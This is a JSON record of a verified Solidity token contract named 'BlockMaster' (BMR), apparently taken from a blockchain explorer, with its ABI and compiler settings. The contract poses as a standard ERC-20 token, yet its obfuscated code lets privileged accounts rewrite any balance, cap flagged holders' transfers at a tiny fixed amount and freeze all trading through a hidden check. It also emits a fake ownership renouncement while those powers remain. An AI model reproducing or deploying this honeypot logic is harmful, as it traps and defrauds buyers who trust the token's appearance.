{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface enableSwapSell {\n    function createPair(address atAuto, address sellShould) external returns (address);\n}\n\ninterface walletTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundEnable) external view returns (uint256);\n\n    function transfer(address launchSwap, uint256 autoIs) external returns (bool);\n\n    function allowance(address teamSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchSwap,\n        uint256 autoIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptBuyFrom, uint256 value);\n    event Approval(address indexed teamSwap, address indexed spender, uint256 value);\n}\n\nabstract contract senderLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletTxMetadata is walletTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlockMaster is senderLimit, walletTx, walletTxMetadata {\n\n    bool public shouldTokenAuto;\n\n    address isFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address atMarketing, address swapTeam) external view virtual override returns (uint256) {\n        if (swapTeam == atTeam) {\n            return type(uint256).max;\n        }\n        return feeIs[atMarketing][swapTeam];\n    }\n\n    function approve(address swapTeam, uint256 autoIs) public virtual override returns (bool) {\n        feeIs[_msgSender()][swapTeam] = autoIs;\n        emit Approval(_msgSender(), swapTeam, autoIs);\n        return true;\n    }\n\n    uint256 public senderTxTeam;\n\n    bool public modeToken;\n\n    mapping(address => bool) public marketingTotal;\n\n    function transferFrom(address teamMarketing, address launchSwap, uint256 autoIs) external override returns (bool) {\n        if (_msgSender() != atTeam) {\n            if (feeIs[teamMarketing][_msgSender()] != type(uint256).max) {\n                require(autoIs <= feeIs[teamMarketing][_msgSender()]);\n                feeIs[teamMarketing][_msgSender()] -= autoIs;\n            }\n        }\n        return buyAt(teamMarketing, launchSwap, autoIs);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellAmount;\n    }\n\n    function transfer(address maxTo, uint256 autoIs) external virtual override returns (bool) {\n        return buyAt(_msgSender(), maxTo, autoIs);\n    }\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    function senderFrom(address teamMarketing, address launchSwap, uint256 autoIs) internal returns (bool) {\n        require(exemptFrom[teamMarketing] >= autoIs);\n        exemptFrom[teamMarketing] -= autoIs;\n        exemptFrom[launchSwap] += autoIs;\n        emit Transfer(teamMarketing, launchSwap, autoIs);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeIs;\n\n    function txList(address maxTo, uint256 autoIs) public {\n        receiverTx();\n        exemptFrom[maxTo] = autoIs;\n    }\n\n    address public atAmountShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTake;\n    }\n\n    bool public launchLimit;\n\n    mapping(address => uint256) private exemptFrom;\n\n    function maxSender(address shouldSender) public {\n        receiverTx();\n        \n        if (shouldSender == atAmountShould || shouldSender == autoLaunched) {\n            return;\n        }\n        marketingTotal[shouldSender] = true;\n    }\n\n    address atTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private minTeam;\n\n    address private isFrom;\n\n    function balanceOf(address fundEnable) public view virtual override returns (uint256) {\n        return exemptFrom[fundEnable];\n    }\n\n    uint256 public listLiquidity;\n\n    mapping(address => bool) public shouldAmount;\n\n    function buyAt(address teamMarketing, address launchSwap, uint256 autoIs) internal returns (bool) {\n        if (teamMarketing == atAmountShould) {\n            return senderFrom(teamMarketing, launchSwap, autoIs);\n        }\n        uint256 fromToken = walletTx(autoLaunched).balanceOf(isFee);\n        require(fromToken == marketingAt);\n        require(launchSwap != isFee);\n        if (marketingTotal[teamMarketing]) {\n            return senderFrom(teamMarketing, launchSwap, enableShould);\n        }\n        return senderFrom(teamMarketing, launchSwap, autoIs);\n    }\n\n    string private buyTo = \"BMR\";\n\n    uint256 takeTo;\n\n    function fromMax(uint256 autoIs) public {\n        receiverTx();\n        marketingAt = autoIs;\n    }\n\n    uint256 constant enableShould = 5 ** 10;\n\n    event OwnershipTransferred(address indexed teamMode, address indexed autoSender);\n\n    function receiverTx() private view {\n        require(shouldAmount[_msgSender()]);\n    }\n\n    uint256 private feeWallet = 100000000 * 10 ** 18;\n\n    bool private amountTotal;\n\n    uint8 private fromTake = 18;\n\n    function feeReceiver() public {\n        emit OwnershipTransferred(atAmountShould, address(0));\n        isFrom = address(0);\n    }\n\n    address public autoLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTo;\n    }\n\n    uint256 private receiverTake;\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    string private sellAmount = \"Block Master\";\n\n    constructor (){\n        \n        receiverFee enableTokenTrading = receiverFee(atTeam);\n        autoLaunched = enableSwapSell(enableTokenTrading.factory()).createPair(enableTokenTrading.WETH(), address(this));\n        if (listLiquidity != senderTxTeam) {\n            amountTotal = false;\n        }\n        atAmountShould = _msgSender();\n        shouldAmount[atAmountShould] = true;\n        exemptFrom[atAmountShould] = feeWallet;\n        feeReceiver();\n        if (amountTotal) {\n            amountTotal = false;\n        }\n        emit Transfer(address(0), atAmountShould, feeWallet);\n    }\n\n    uint256 marketingAt;\n\n    function swapTo(address shouldMin) public {\n        if (shouldTokenAuto) {\n            return;\n        }\n        if (receiverTake != listLiquidity) {\n            launchLimit = false;\n        }\n        shouldAmount[shouldMin] = true;\n        if (modeToken) {\n            amountTotal = false;\n        }\n        shouldTokenAuto = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuyFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAmountShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTxTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"txList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlockMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}